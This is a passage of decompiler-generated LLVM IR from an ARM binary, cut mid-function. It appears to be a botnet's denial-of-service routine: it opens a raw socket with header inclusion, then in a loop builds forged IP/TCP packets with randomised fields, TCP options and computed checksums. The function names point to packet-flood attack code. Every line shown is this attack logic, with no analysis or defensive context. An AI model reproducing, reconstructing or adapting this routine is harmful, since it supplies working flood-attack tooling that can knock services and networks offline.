  store i32 %v0_c380, i32* %r1.global-to-local, align 4
  store i32 25, i32* %r2.global-to-local, align 4
  %v0_c388 = load i32, i32* @r4, align 4
  store i32 %v0_c388, i32* %r0.global-to-local, align 4
  %v5_c38c = inttoptr i32 %v0_c380 to i32*
  %v6_c38c = call i32 @attack_get_opt_ip(i32 %v0_c388, i32* %v5_c38c, i32 25, i32 %v2_c37c, i32 %v6_c370)
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_c3a0 = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v3_c3a0, i32* %r0.global-to-local, align 4
  %v7_c3a4 = icmp eq i32 %v3_c3a0, -1
  store i1 %v7_c3a4, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_c3a0, i32* @sl, align 4
  br i1 %v7_c3a4, label %dec_label_pc_c878, label %dec_label_pc_c3b0

dec_label_pc_c3b0:                                ; preds = %entry
  store i32 1, i32* %stack_var_-44, align 4
  %v6_c3b8 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_c3b8, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v5_c3cc = call i32 @__GI_setsockopt(i32 %v3_c3a0, i32 0, i32 3, i32 %v6_c3b8, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_c3cc, i32* %r0.global-to-local, align 4
  %v7_c3d0 = icmp eq i32 %v5_c3cc, -1
  store i1 %v7_c3d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_c3d0, label %dec_label_pc_c870, label %dec_label_pc_c3d8

dec_label_pc_c3d8:                                ; preds = %dec_label_pc_c3b0
  %v3_c3e0 = mul i32 %v7_c234, 65536
  store i32 %v3_c3e0, i32* %r0.global-to-local, align 4
  %v0_c3e4 = load i32, i32* %fp.global-to-local, align 4
  %v3_c3e4 = mul i32 %v0_c3e4, 65536
  store i32 %v3_c3e4, i32* %r4.global-to-local, align 4
  %v0_c3e8 = load i32, i32* @r6, align 4
  store i32 0, i32* %stack_var_-44, align 4
  store i32 %v6_c2f8, i32* %r2.global-to-local, align 4
  %v3_c3f4 = urem i32 %v7_c234, 65536
  store i32 %v3_c3f4, i32* %r3.global-to-local, align 4
  %v3_c3f8 = urem i32 %v0_c3e4, 65536
  %v3_c3fc = urem i32 %v0_c3e8, 65536
  store i32 %v3_c3fc, i32* %r1.global-to-local, align 4
  %v0_c400 = load i32, i32* @r7, align 4
  %v2_c400 = icmp eq i32 %v0_c400, 0
  store i1 %v2_c400, i1* %cpsr_z.global-to-local, align 1
  %v1_c410 = urem i32 %v6_c2f8, 256
  store i32 %v1_c410, i32* @fp, align 4
  br i1 %v2_c400, label %dec_label_pc_c664.preheader, label %dec_label_pc_c418

dec_label_pc_c418:                                ; preds = %dec_label_pc_c3d8
  %tmp52 = mul i32 %v5_c2c8, 256
  %v3_c430 = and i32 %tmp52, 65280
  %tmp53 = udiv i32 %v7_c234, 256
  %v3_c434 = urem i32 %tmp53, 256
  %tmp54 = udiv i32 %v5_c2c8, 256
  %v4_c43c = urem i32 %tmp54, 256
  %v5_c43c = or i32 %v4_c43c, %v3_c430
  store i32 %v5_c43c, i32* @lr, align 4
  %v1_c438 = mul i32 %v7_c234, 256
  %v4_c440 = and i32 %v1_c438, 65280
  %v5_c440 = or i32 %v4_c440, %v3_c434
  %tmp55 = mul i32 %v0_c3e4, 256
  %v3_c44c = and i32 %tmp55, 65280
  %tmp56 = mul i32 %v0_c3e8, 256
  %v3_c450 = and i32 %tmp56, 65280
  %v1_c454 = urem i32 %v6_c2f8, 2
  %v1_c458 = urem i32 %v6_c310, 2
  %tmp57 = udiv i32 %v0_c3e4, 256
  %v4_c45c = urem i32 %tmp57, 256
  %v5_c45c = or i32 %v4_c45c, %v3_c44c
  store i32 %v5_c45c, i32* @r6, align 4
  %tmp58 = udiv i32 %v0_c3e8, 256
  %v4_c460 = urem i32 %tmp58, 256
  %v5_c460 = or i32 %v4_c460, %v3_c450
  store i32 %v5_c460, i32* @r5, align 4
  %v1_c47c = urem i32 %v6_c328, 2
  store i32 %v1_c47c, i32* %r2.global-to-local, align 4
  %v1_c480 = urem i32 %v6_c340, 2
  store i32 %v1_c480, i32* %r3.global-to-local, align 4
  %v1_c484 = urem i32 %v6_c358, 2
  store i32 %v1_c484, i32* %r0.global-to-local, align 4
  %v1_c488 = urem i32 %v6_c370, 2
  store i32 %v1_c488, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %sext4 = mul nuw i32 %v5_c440, 65536
  %v4_c510 = sdiv i32 %sext4, 65536
  %tmp = sub nsw i32 0, %v1_c458
  %v4_c574 = and i32 %tmp, 16
  %tmp62 = sub nsw i32 0, %v1_c47c
  %v4_c588 = and i32 %tmp62, 8
  %tmp63 = sub nsw i32 0, %v1_c480
  %v4_c5a0 = and i32 %tmp63, 4
  %tmp64 = sub nsw i32 0, %v1_c484
  %v3_c5b4 = and i32 %tmp64, 2
  %v1_c504 = trunc i32 %v6_c24c to i8
  br label %dec_label_pc_c4a8

dec_label_pc_c4a8:                                ; preds = %bb61, %dec_label_pc_c418
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 128, i32* %r0.global-to-local, align 4
  %v2_c4b0 = call i32 @calloc(i32 128, i32 1)
  store i32 %v2_c4b0, i32* %r0.global-to-local, align 4
  %v3_c4b4 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c4b4, i32* %r2.global-to-local, align 4
  %v1_c4b8 = load i32, i32* @sb, align 4
  %v2_c4b8 = load i32, i32* @r4, align 4
  %v5_c4b8 = mul i32 %v2_c4b8, 4
  %v6_c4b8 = add i32 %v5_c4b8, %v1_c4b8
  %v7_c4b8 = inttoptr i32 %v6_c4b8 to i32*
  store i32 %v2_c4b0, i32* %v7_c4b8, align 4
  %v0_c4bc = load i32, i32* %r2.global-to-local, align 4
  %v3_c4bc = mul i32 %v0_c4bc, 32
  store i32 %v3_c4bc, i32* %r3.global-to-local, align 4
  %v0_c4c0 = load i32, i32* @sb, align 4
  %v4_c4c0 = mul i32 %v0_c4bc, 4
  %v5_c4c0 = add i32 %v0_c4c0, %v4_c4c0
  %v6_c4c0 = inttoptr i32 %v5_c4c0 to i32*
  %v7_c4c0 = load i32, i32* %v6_c4c0, align 4
  store i32 %v7_c4c0, i32* %r4.global-to-local, align 4
  %v5_c4c4 = mul i32 %v0_c4bc, 24
  store i32 %v5_c4c4, i32* %r3.global-to-local, align 4
  %v1_c4c8 = load i32, i32* @r8, align 4
  %v2_c4c8 = add i32 %v1_c4c8, %v5_c4c4
  store i32 %v2_c4c8, i32* %r0.global-to-local, align 4
  %v1_c4cc = inttoptr i32 %v7_c4c0 to i8*
  %v2_c4cc = load i8, i8* %v1_c4cc, align 1
  %tmp65 = urem i8 %v2_c4cc, 16
  %v1_c4d0 = zext i8 %tmp65 to i32
  %v1_c4d4 = or i32 %v1_c4d0, 64
  store i32 %v1_c4d4, i32* %r3.global-to-local, align 4
  %v1_c4d8 = trunc i32 %v1_c4d4 to i8
  store i8 %v1_c4d8, i8* %v1_c4cc, align 1
  %v0_c4dc = load i32, i32* %r4.global-to-local, align 4
  %v1_c4dc = inttoptr i32 %v0_c4dc to i8*
  %v2_c4dc = load i8, i8* %v1_c4dc, align 1
  %v1_c4e0 = and i8 %v2_c4dc, -16
  %v1_c4e4 = or i8 %v1_c4e0, 5
  store i32 %v1_c278, i32* %r3.global-to-local, align 4
  store i8 %v1_c4e4, i8* %v1_c4dc, align 1
  %v2_c4f4 = load i32, i32* %r4.global-to-local, align 4
  %v3_c4f4 = add i32 %v2_c4f4, 1
  %v4_c4f4 = inttoptr i32 %v3_c4f4 to i8*
  store i8 %v5_c230, i8* %v4_c4f4, align 1
  store i32 %v1_c254, i32* %r2.global-to-local, align 4
  %v0_c4fc = load i32, i32* %r3.global-to-local, align 4
  %v2_c4fc = icmp eq i32 %v0_c4fc, 0
  store i1 %v2_c4fc, i1* %cpsr_z.global-to-local, align 1
  store i32 15360, i32* %r3.global-to-local, align 4
  %v2_c504 = load i32, i32* %r4.global-to-local, align 4
  %v3_c504 = add i32 %v2_c504, 8
  %v4_c504 = inttoptr i32 %v3_c504 to i8*
  store i8 %v1_c504, i8* %v4_c504, align 1
  %v0_c508 = load i32, i32* %r3.global-to-local, align 4
  %v1_c508 = trunc i32 %v0_c508 to i16
  %v2_c508 = load i32, i32* %r4.global-to-local, align 4
  %v3_c508 = add i32 %v2_c508, 2
  %v4_c508 = inttoptr i32 %v3_c508 to i16*
  store i16 %v1_c508, i16* %v4_c508, align 2
  store i32 6, i32* %r3.global-to-local, align 4
  store i32 %v4_c510, i32* %r1.global-to-local, align 4
  %v0_c514 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_c514, label %bb59, label %bb

bb:                                               ; preds = %dec_label_pc_c4a8
  store i32 64, i32* %r2.global-to-local, align 4
  br label %bb59

bb59:                                             ; preds = %dec_label_pc_c4a8, %bb
  %v2_c518 = load i32, i32* %r4.global-to-local, align 4
  %v3_c518 = add i32 %v2_c518, 9
  %v4_c518 = inttoptr i32 %v3_c518 to i8*
  store i8 6, i8* %v4_c518, align 1
  %v0_c51c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_c51c, label %bb61, label %bb60

bb60:                                             ; preds = %bb59
  %v1_c51c = load i32, i32* %r2.global-to-local, align 4
  %v2_c51c = trunc i32 %v1_c51c to i16
  %v3_c51c = load i32, i32* %r4.global-to-local, align 4
  %v4_c51c = add i32 %v3_c51c, 6
  %v5_c51c = inttoptr i32 %v4_c51c to i16*
  store i16 %v2_c51c, i16* %v5_c51c, align 2
  br label %bb61

bb61:                                             ; preds = %bb59, %bb60
  store i32 %v6_c38c, i32* %r2.global-to-local, align 4
  %v1_c524 = load i32, i32* %r4.global-to-local, align 4
  %v2_c524 = add i32 %v1_c524, 12
  %v3_c524 = inttoptr i32 %v2_c524 to i32*
  store i32 %v6_c38c, i32* %v3_c524, align 4
  %v0_c528 = load i32, i32* %r0.global-to-local, align 4
  %v1_c528 = add i32 %v0_c528, 16
  %v2_c528 = inttoptr i32 %v1_c528 to i32*
  %v3_c528 = load i32, i32* %v2_c528, align 4
  store i32 %v3_c528, i32* %r3.global-to-local, align 4
  %v0_c52c = load i32, i32* %r1.global-to-local, align 4
  %v1_c52c = trunc i32 %v0_c52c to i16
  %v2_c52c = load i32, i32* %r4.global-to-local, align 4
  %v3_c52c = add i32 %v2_c52c, 4
  %v4_c52c = inttoptr i32 %v3_c52c to i16*
  store i16 %v1_c52c, i16* %v4_c52c, align 2
  %v0_c530 = load i32, i32* %r3.global-to-local, align 4
  %v1_c530 = load i32, i32* %r4.global-to-local, align 4
  %v2_c530 = add i32 %v1_c530, 16
  %v3_c530 = inttoptr i32 %v2_c530 to i32*
  store i32 %v0_c530, i32* %v3_c530, align 4
  %v0_c534 = load i32, i32* @r6, align 4
  %v1_c534 = trunc i32 %v0_c534 to i16
  %v2_c534 = load i32, i32* %r4.global-to-local, align 4
  %v3_c534 = add i32 %v2_c534, 20
  %v4_c534 = inttoptr i32 %v3_c534 to i16*
  store i16 %v1_c534, i16* %v4_c534, align 2
  %v0_c538 = load i32, i32* %r4.global-to-local, align 4
  %v1_c538 = add i32 %v0_c538, 20
  store i32 %v1_c538, i32* %r1.global-to-local, align 4
  %v1_c53c = add i32 %v0_c538, 32
  %v2_c53c = inttoptr i32 %v1_c53c to i8*
  %v3_c53c = load i8, i8* %v2_c53c, align 1
  %v4_c53c = zext i8 %v3_c53c to i32
  store i32 %v4_c53c, i32* %r3.global-to-local, align 4
  %v1_c540 = add i32 %v0_c538, 33
  %v2_c540 = inttoptr i32 %v1_c540 to i8*
  %v3_c540 = load i8, i8* %v2_c540, align 1
  %v4_c540 = zext i8 %v3_c540 to i32
  store i32 %v1_c454, i32* %r0.global-to-local, align 4
  %v1_c548 = urem i8 %v3_c53c, 16
  %v1_c54c = or i8 %v1_c548, -96
  %v1_c550 = and i32 %v4_c540, 223
  store i32 %v1_c550, i32* %r2.global-to-local, align 4
  store i8 %v1_c54c, i8* %v2_c53c, align 1
  %v0_c558 = load i32, i32* %r2.global-to-local, align 4
  %v1_c558 = load i32, i32* %r0.global-to-local, align 4
  %v4_c558 = mul i32 %v1_c558, 32
  %v5_c558 = or i32 %v4_c558, %v0_c558
  store i32 %v5_c558, i32* %r2.global-to-local, align 4
  store i32 %v5_c43c, i32* %r3.global-to-local, align 4
  %v1_c560 = trunc i32 %v5_c558 to i8
  %v2_c560 = load i32, i32* %r1.global-to-local, align 4
  %v3_c560 = add i32 %v2_c560, 13
  %v4_c560 = inttoptr i32 %v3_c560 to i8*
  store i8 %v1_c560, i8* %v4_c560, align 1
  %v0_c564 = load i32, i32* %r3.global-to-local, align 4
  %v1_c564 = load i32, i32* %r1.global-to-local, align 4
  %v2_c564 = add i32 %v1_c564, 4
  %v3_c564 = inttoptr i32 %v2_c564 to i32*
  store i32 %v0_c564, i32* %v3_c564, align 4
  %v0_c568 = load i32, i32* %r1.global-to-local, align 4
  %v1_c568 = add i32 %v0_c568, 13
  %v2_c568 = inttoptr i32 %v1_c568 to i8*
  %v3_c568 = load i8, i8* %v2_c568, align 1
  %v4_c568 = zext i8 %v3_c568 to i32
  store i32 %v1_c458, i32* %r0.global-to-local, align 4
  %v1_c570 = and i32 %v4_c568, 239
  %v5_c574 = or i32 %v1_c570, %v4_c574
  store i32 %v5_c574, i32* %r3.global-to-local, align 4
  %v1_c578 = trunc i32 %v5_c574 to i8
  store i8 %v1_c578, i8* %v2_c568, align 1
  %v0_c57c = load i32, i32* %r1.global-to-local, align 4
  %v1_c57c = add i32 %v0_c57c, 13
  %v2_c57c = inttoptr i32 %v1_c57c to i8*
  %v3_c57c = load i8, i8* %v2_c57c, align 1
  %v4_c57c = zext i8 %v3_c57c to i32
  store i32 %v1_c47c, i32* %r3.global-to-local, align 4
  %v1_c584 = and i32 %v4_c57c, 247
  %v5_c588 = or i32 %v1_c584, %v4_c588
  store i32 %v5_c588, i32* %r2.global-to-local, align 4
  %v0_c58c = load i32, i32* @r5, align 4
  %v1_c58c = trunc i32 %v0_c58c to i16
  %v3_c58c = add i32 %v0_c57c, 2
  %v4_c58c = inttoptr i32 %v3_c58c to i16*
  store i16 %v1_c58c, i16* %v4_c58c, align 2
  %v0_c590 = load i32, i32* %r2.global-to-local, align 4
  %v1_c590 = trunc i32 %v0_c590 to i8
  %v2_c590 = load i32, i32* %r1.global-to-local, align 4
  %v3_c590 = add i32 %v2_c590, 13
  %v4_c590 = inttoptr i32 %v3_c590 to i8*
  store i8 %v1_c590, i8* %v4_c590, align 1
  %v0_c594 = load i32, i32* %r1.global-to-local, align 4
  %v1_c594 = add i32 %v0_c594, 13
  %v2_c594 = inttoptr i32 %v1_c594 to i8*
  %v3_c594 = load i8, i8* %v2_c594, align 1
  %v4_c594 = zext i8 %v3_c594 to i32
  store i32 %v1_c480, i32* %r0.global-to-local, align 4
  %v1_c59c = and i32 %v4_c594, 251
  %v5_c5a0 = or i32 %v1_c59c, %v4_c5a0
  store i32 %v5_c5a0, i32* %r3.global-to-local, align 4
  %v1_c5a4 = trunc i32 %v5_c5a0 to i8
  store i8 %v1_c5a4, i8* %v2_c594, align 1
  %v0_c5a8 = load i32, i32* %r1.global-to-local, align 4
  %v1_c5a8 = add i32 %v0_c5a8, 13
  %v2_c5a8 = inttoptr i32 %v1_c5a8 to i8*
  %v3_c5a8 = load i8, i8* %v2_c5a8, align 1
  %v4_c5a8 = zext i8 %v3_c5a8 to i32
  store i32 %v1_c484, i32* %r3.global-to-local, align 4
  %v1_c5b0 = and i32 %v4_c5a8, 253
  %v4_c5b4 = or i32 %v1_c5b0, %v3_c5b4
  store i32 %v4_c5b4, i32* %r2.global-to-local, align 4
  %v1_c5b8 = trunc i32 %v4_c5b4 to i8
  store i8 %v1_c5b8, i8* %v2_c5a8, align 1
  %v0_c5bc = load i32, i32* %r1.global-to-local, align 4
  %v1_c5bc = add i32 %v0_c5bc, 13
  %v2_c5bc = inttoptr i32 %v1_c5bc to i8*
  %v3_c5bc = load i8, i8* %v2_c5bc, align 1
  %v4_c5bc = zext i8 %v3_c5bc to i32
  store i32 %v1_c488, i32* %r0.global-to-local, align 4
  %v1_c5c4 = and i32 %v4_c5bc, 254
  %v2_c5c8 = or i32 %v1_c5c4, %v1_c488
  store i32 %v2_c5c8, i32* %r3.global-to-local, align 4
  %v1_c5cc = trunc i32 %v2_c5c8 to i8
  store i8 %v1_c5cc, i8* %v2_c5bc, align 1
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r1.global-to-local, align 4
  %v2_c5d8 = load i32, i32* %r4.global-to-local, align 4
  %v3_c5d8 = add i32 %v2_c5d8, 40
  %v4_c5d8 = inttoptr i32 %v3_c5d8 to i8*
  store i8 2, i8* %v4_c5d8, align 1
  %v0_c5dc = load i32, i32* %r2.global-to-local, align 4
  %v1_c5dc = trunc i32 %v0_c5dc to i8
  %v2_c5dc = load i32, i32* %r4.global-to-local, align 4
  %v3_c5dc = add i32 %v2_c5dc, 41
  %v4_c5dc = inttoptr i32 %v3_c5dc to i8*
  store i8 %v1_c5dc, i8* %v4_c5dc, align 1
  %v0_c5e0 = call i32 @rand_next()
  %v1_c5e4 = urem i32 %v0_c5e0, 16
  %v1_c5e8 = or i32 %v1_c5e4, 1392
  %tmp66 = mul nuw nsw i32 %v1_c5e8, 256
  %v3_c5f4 = add nuw nsw i32 %tmp66, 2048
  %v5_c5fc = or i32 %v3_c5f4, 5
  %v1_c600 = trunc i32 %v5_c5fc to i16
  %v2_c600 = load i32, i32* %r4.global-to-local, align 4
  %v3_c600 = add i32 %v2_c600, 42
  %v4_c600 = inttoptr i32 %v3_c600 to i16*
  store i16 %v1_c600, i16* %v4_c600, align 2
  %v2_c608 = load i32, i32* %r4.global-to-local, align 4
  %v3_c608 = add i32 %v2_c608, 44
  %v4_c608 = inttoptr i32 %v3_c608 to i8*
  store i8 4, i8* %v4_c608, align 1
  store i32 10, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r3.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_c618 = load i32, i32* %r4.global-to-local, align 4
  %v3_c618 = add i32 %v2_c618, 46
  %v4_c618 = inttoptr i32 %v3_c618 to i8*
  store i8 8, i8* %v4_c618, align 1
  %v0_c61c = load i32, i32* %r2.global-to-local, align 4
  %v1_c61c = trunc i32 %v0_c61c to i8
  %v2_c61c = load i32, i32* %r4.global-to-local, align 4
  %v3_c61c = add i32 %v2_c61c, 47
  %v4_c61c = inttoptr i32 %v3_c61c to i8*
  store i8 %v1_c61c, i8* %v4_c61c, align 1
  %v0_c620 = load i32, i32* %r0.global-to-local, align 4
  %v1_c620 = trunc i32 %v0_c620 to i8
  %v2_c620 = load i32, i32* %r4.global-to-local, align 4
  %v3_c620 = add i32 %v2_c620, 45
  %v4_c620 = inttoptr i32 %v3_c620 to i8*
  store i8 %v1_c620, i8* %v4_c620, align 1
  %v0_c624 = call i32 @rand_next()
  store i32 %v0_c624, i32* %r0.global-to-local, align 4
  %v2_c62c = load i32, i32* %r4.global-to-local, align 4
  %v3_c62c = add i32 %v2_c62c, 59
  %v4_c62c = inttoptr i32 %v3_c62c to i8*
  store i8 6, i8* %v4_c62c, align 1
  store i32 3, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v1_c63c = load i32, i32* %r4.global-to-local, align 4
  %v2_c63c = add i32 %v1_c63c, 48
  %v3_c63c = inttoptr i32 %v2_c63c to i32*
  store i32 %v0_c624, i32* %v3_c63c, align 4
  %v0_c640 = load i32, i32* %r3.global-to-local, align 4
  %v1_c640 = load i32, i32* %r4.global-to-local, align 4
  %v2_c640 = add i32 %v1_c640, 52
  %v3_c640 = inttoptr i32 %v2_c640 to i32*
  store i32 %v0_c640, i32* %v3_c640, align 4
  %v0_c644 = load i32, i32* %r2.global-to-local, align 4
  %v1_c644 = trunc i32 %v0_c644 to i8
  %v2_c644 = load i32, i32* %r4.global-to-local, align 4
  %v3_c644 = add i32 %v2_c644, 56
  %v4_c644 = inttoptr i32 %v3_c644 to i8*
  store i8 %v1_c644, i8* %v4_c644, align 1
  %v0_c648 = load i32, i32* %r1.global-to-local, align 4
  %v1_c648 = trunc i32 %v0_c648 to i8
  %v2_c648 = load i32, i32* %r4.global-to-local, align 4
  %v3_c648 = add i32 %v2_c648, 58
  %v4_c648 = inttoptr i32 %v3_c648 to i8*
  store i8 %v1_c648, i8* %v4_c648, align 1
  %v0_c64c = load i32, i32* %r1.global-to-local, align 4
  %v1_c64c = trunc i32 %v0_c64c to i8
  %v2_c64c = load i32, i32* %r4.global-to-local, align 4
  %v3_c64c = add i32 %v2_c64c, 57
  %v4_c64c = inttoptr i32 %v3_c64c to i8*
  store i8 %v1_c64c, i8* %v4_c64c, align 1
  %v3_c650 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c650, i32* %r3.global-to-local, align 4
  %v1_c654 = load i32, i32* %r2.global-to-local, align 4
  %v2_c654 = add i32 %v1_c654, %v3_c650
  store i32 %v2_c654, i32* @r4, align 4
  %v1_c658 = load i32, i32* @r7, align 4
  %v9_c658 = icmp eq i32 %v2_c654, %v1_c658
  store i1 %v9_c658, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_c654, i32* %stack_var_-44, align 4
  %v5_c660 = icmp slt i32 %v2_c654, %v1_c658
  br i1 %v5_c660, label %dec_label_pc_c4a8, label %dec_label_pc_c664.preheader

dec_label_pc_c664.preheader:                      ; preds = %bb61, %dec_label_pc_c3d8
  %v0_c6686 = phi i32 [ 0, %dec_label_pc_c3d8 ], [ %v1_c658, %bb61 ]
  %v3_c7e0 = icmp eq i32 %v6_c38c, -1
  %v8_c7e0 = icmp eq i32 %v6_c38c, -1
  %v3_c6b0 = icmp eq i32 %v3_c3f4, 65535
  br label %dec_label_pc_c664

dec_label_pc_c664:                                ; preds = %dec_label_pc_c664, %dec_label_pc_c774, %dec_label_pc_c664.preheader
  %v0_c668 = phi i32 [ %v0_c6686, %dec_label_pc_c664.preheader ], [ 0, %dec_label_pc_c774 ], [ 0, %dec_label_pc_c664 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_c668 = icmp eq i32 %v0_c668, 0
  store i1 %v2_c668, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_c668, label %dec_label_pc_c664, label %dec_label_pc_c674

dec_label_pc_c674:                                ; preds = %dec_label_pc_c664, %dec_label_pc_c774
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_c678

dec_label_pc_c678:                                ; preds = %dec_label_pc_c6f0, %dec_label_pc_c674
  %v1_c688 = phi i32 [ %v1_c764, %dec_label_pc_c6f0 ], [ 0, %dec_label_pc_c674 ]
  %v5_c67c = mul i32 %v1_c688, 24
  %v1_c680 = load i32, i32* @r8, align 4
  %v2_c680 = add i32 %v1_c680, %v5_c67c
  store i32 %v2_c680, i32* %r3.global-to-local, align 4
  %v1_c684 = add i32 %v2_c680, 20
  %v2_c684 = inttoptr i32 %v1_c684 to i8*
  %v3_c684 = load i8, i8* %v2_c684, align 1
  %v4_c684 = zext i8 %v3_c684 to i32
  store i32 %v4_c684, i32* %r2.global-to-local, align 4
  %v0_c688 = load i32, i32* @sb, align 4
  %v4_c688 = mul i32 %v1_c688, 4
  %v5_c688 = add i32 %v0_c688, %v4_c688
  %v6_c688 = inttoptr i32 %v5_c688 to i32*
  %v7_c688 = load i32, i32* %v6_c688, align 4
  store i32 %v7_c688, i32* @r5, align 4
  %v7_c68c = icmp eq i8 %v3_c684, 31
  store i1 %v7_c68c, i1* %cpsr_z.global-to-local, align 1
  %v1_c690 = add i32 %v7_c688, 20
  store i32 %v1_c690, i32* @r6, align 4
  %tmp67 = icmp ult i8 %v3_c684, 32
  br i1 %tmp67, label %dec_label_pc_c788, label %dec_label_pc_c698

dec_label_pc_c698:                                ; preds = %dec_label_pc_c678
  store i32 %v6_c38c, i32* %r3.global-to-local, align 4
  store i1 %v8_c7e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_c7e0, label %dec_label_pc_c7e8, label %dec_label_pc_c6a4

dec_label_pc_c6a4:                                ; preds = %dec_label_pc_c788, %dec_label_pc_c698
  store i32 %v3_c3f4, i32* %r0.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_c6b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_c6b0, label %dec_label_pc_c804, label %dec_label_pc_c6b8

dec_label_pc_c6b8:                                ; preds = %dec_label_pc_c7e8, %dec_label_pc_c6a4
  %v1_c6bc = phi i32 [ %v1_c7f8, %dec_label_pc_c7e8 ], [ 65535, %dec_label_pc_c6a4 ]
  store i32 %v3_c3f8, i32* %r1.global-to-local, align 4
  %v9_c6bc = icmp eq i32 %v3_c3f8, %v1_c6bc
  store i1 %v9_c6bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c6bc, label %dec_label_pc_c818, label %dec_label_pc_c6c4

dec_label_pc_c6c4:                                ; preds = %dec_label_pc_c804.dec_label_pc_c6c4_crit_edge, %dec_label_pc_c6b8
  %v1_c6c8 = phi i32 [ %v1_c6c8.pre, %dec_label_pc_c804.dec_label_pc_c6c4_crit_edge ], [ %v1_c6bc, %dec_label_pc_c6b8 ]
  store i32 %v3_c3fc, i32* %r2.global-to-local, align 4
  %v9_c6c8 = icmp eq i32 %v3_c3fc, %v1_c6c8
  store i1 %v9_c6c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c6c8, label %dec_label_pc_c82c, label %dec_label_pc_c6d0

dec_label_pc_c6d0:                                ; preds = %dec_label_pc_c818.dec_label_pc_c6d0_crit_edge, %dec_label_pc_c6c4
  %v1_c6d4 = phi i32 [ %v1_c6d4.pre, %dec_label_pc_c818.dec_label_pc_c6d0_crit_edge ], [ %v1_c6c8, %dec_label_pc_c6c4 ]
  store i32 %v5_c2c8, i32* %r3.global-to-local, align 4
  %v9_c6d4 = icmp eq i32 %v5_c2c8, %v1_c6d4
  store i1 %v9_c6d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c6d4, label %dec_label_pc_c840, label %dec_label_pc_c6dc

dec_label_pc_c6dc:                                ; preds = %dec_label_pc_c82c.dec_label_pc_c6dc_crit_edge, %dec_label_pc_c6d0
  %v1_c6e0 = phi i32 [ %v1_c6e0.pre, %dec_label_pc_c82c.dec_label_pc_c6dc_crit_edge ], [ %v1_c6d4, %dec_label_pc_c6d0 ]
  store i32 %v6_c2e0, i32* %r0.global-to-local, align 4
  %v9_c6e0 = icmp eq i32 %v6_c2e0, %v1_c6e0
  store i1 %v9_c6e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_c6e0, label %dec_label_pc_c854, label %dec_label_pc_c6e8

dec_label_pc_c6e8:                                ; preds = %dec_label_pc_c840, %dec_label_pc_c6dc
  %v0_c6e8 = load i32, i32* @fp, align 4
  %v2_c6e8 = icmp eq i32 %v0_c6e8, 0
  store i1 %v2_c6e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_c6e8, label %dec_label_pc_c6f0, label %dec_label_pc_c864

dec_label_pc_c6f0:                                ; preds = %dec_label_pc_c6e8, %dec_label_pc_c854, %dec_label_pc_c864
  %v2_c6f4 = load i32, i32* @r5, align 4
  %v3_c6f4 = add i32 %v2_c6f4, 10
  %v4_c6f4 = inttoptr i32 %v3_c6f4 to i16*
  store i16 0, i16* %v4_c6f4, align 2
  %v0_c6f8 = load i32, i32* @r5, align 4
  store i32 %v0_c6f8, i32* @r0, align 4
  store i32 20, i32* %r1.global-to-local, align 4
  %v2_c700 = call i32 @checksum_generic(i32 %v0_c6f8, i32 20)
  %v3_c700 = trunc i32 %v2_c700 to i16
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_c708 = load i32, i32* @r5, align 4
  %v4_c708 = add i32 %v3_c708, 10
  %v5_c708 = inttoptr i32 %v4_c708 to i16*
  store i16 %v3_c700, i16* %v5_c708, align 2
  %v0_c70c = load i32, i32* @r6, align 4
  store i32 %v0_c70c, i32* @r1, align 4
  %v0_c710 = load i32, i32* %r2.global-to-local, align 4
  %v1_c710 = trunc i32 %v0_c710 to i16
  %v3_c710 = add i32 %v0_c70c, 16
  %v4_c710 = inttoptr i32 %v3_c710 to i16*
  store i16 %v1_c710, i16* %v4_c710, align 2
  store i32 40, i32* %r3.global-to-local, align 4
  store i32 10240, i32* %r2.global-to-local, align 4
  %v0_c71c = load i32, i32* @r5, align 4
  store i32 %v0_c71c, i32* %r0.global-to-local, align 4
  %v4_c720 = call i32 @checksum_tcpudp(i32 %v0_c71c, i32 %v0_c70c, i32 10240, i32 40)
  %v5_c720 = trunc i32 %v4_c720 to i16
  store i32 %v4_c720, i32* %r0.global-to-local, align 4
  %v3_c724 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_c724, i32* %r3.global-to-local, align 4
  %v3_c728 = mul i32 %v3_c724, 32
  store i32 %v3_c728, i32* %lr.global-to-local, align 4
  %v3_c72c = load i32, i32* @r6, align 4
  %v4_c72c = add i32 %v3_c72c, 16
  %v5_c72c = inttoptr i32 %v4_c72c to i16*
  store i16 %v5_c720, i16* %v5_c72c, align 2
  %v0_c730 = load i32, i32* %lr.global-to-local, align 4
  %v1_c730 = load i32, i32* %r3.global-to-local, align 4
  %tmp68 = mul i32 %v1_c730, -8
  %v5_c730 = add i32 %v0_c730, %tmp68
